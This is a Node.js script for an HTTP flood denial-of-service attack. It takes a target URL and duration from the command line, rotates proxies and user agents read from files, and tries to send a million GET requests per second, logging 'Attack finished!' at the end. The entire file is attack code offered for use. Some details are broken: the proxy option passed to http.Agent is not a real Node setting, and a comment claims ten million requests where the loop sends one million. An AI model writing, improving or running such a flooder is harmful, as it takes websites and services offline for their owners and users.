const http = require('http');
const fs = require('fs');
const url = require('url');

const targetUrl = process.argv[2]; // Target URL provided as command line argument
const duration = parseInt(process.argv[3]); // Duration in seconds provided as command line argument
const proxyList = fs.readFileSync('proxy.txt', 'utf8').split('\n').filter(Boolean); // Read proxies from proxy.txt
const userAgentList = fs.readFileSync('ua.txt', 'utf8').split('\n').filter(Boolean); // Read user-agents from ua.txt

const sendRequest = () => {
  const proxy = getRandomElement(proxyList);
  const userAgent = getRandomElement(userAgentList);

  const parsedUrl = new URL(targetUrl); // Parse the target URL
  const options = {
    hostname: parsedUrl.hostname,
    port: parsedUrl.port || 80,
    path: parsedUrl.pathname,
    method: 'GET',
    headers: {
      'User-Agent': userAgent,
    },
    timeout: 10000, // Timeout in milliseconds
    agent: new http.Agent({
      keepAlive: true,
      maxSockets: 256, // Adjust this value based on your system's capacity
      proxy: 'http://' + proxy,
    }),
  };

  const req = http.request(options, (res) => {
    res.on('data', () => {});
    res.on('end', () => {});
  });

  req.on('error', (err) => {
    console.error('Request error:', err);
  });

  req.end();
};

const getRandomElement = (arr) => {
  return arr[Math.floor(Math.random() * arr.length)];
};

const startAttack = () => {
  const startTime = Date.now();
  const endTime = startTime + duration * 1000; // Convert duration to milliseconds
  let requestsSent = 0;

  const sendRequestsInterval = setInterval(() => {
    const currentTime = Date.now();
    if (currentTime >= endTime) {
      clearInterval(sendRequestsInterval);
      console.log('Attack finished!');
      return;
    }

    for (let i = 0; i < 1_000_000; i++) { // Send 10M requests per second
      sendRequest();
      requestsSent++;
    }

    console.log(`Sent ${requestsSent} requests.`);
    requestsSent = 0;
  }, 1000); // Send requests every second
};

// Start the attack
startAttack();
